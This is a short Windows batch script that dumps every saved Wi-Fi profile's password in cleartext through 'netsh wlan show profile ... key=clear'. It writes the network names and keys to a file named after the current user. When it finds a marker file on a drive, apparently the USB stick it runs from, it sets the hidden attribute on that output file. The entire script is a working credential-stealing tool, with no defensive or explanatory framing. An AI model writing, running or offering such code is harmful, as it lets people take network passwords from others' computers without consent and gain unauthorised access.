@echo off
setlocal enabledelayedexpansion

:: Get the current user's username
for /f "tokens=*" %%u in ('whoami') do (
    set "username=%%u"
    :: Remove the domain part from the username (if it exists)
    set "username=!username:*\=!"
)

:: Create the output filename using the username
set "output_file=Output_!username!.txt"

(for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        set wifi_pwd=%%F
    )
    echo %%a : !wifi_pwd!
)) > "%output_file%"

echo "Output saved to %output_file%"

rem Check if the script is running from a USB drive
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%i:\usb_marker_file.txt" (
        rem Set the hidden attribute for the output file
        attrib +h "%%i:\%output_file%"
    )
)
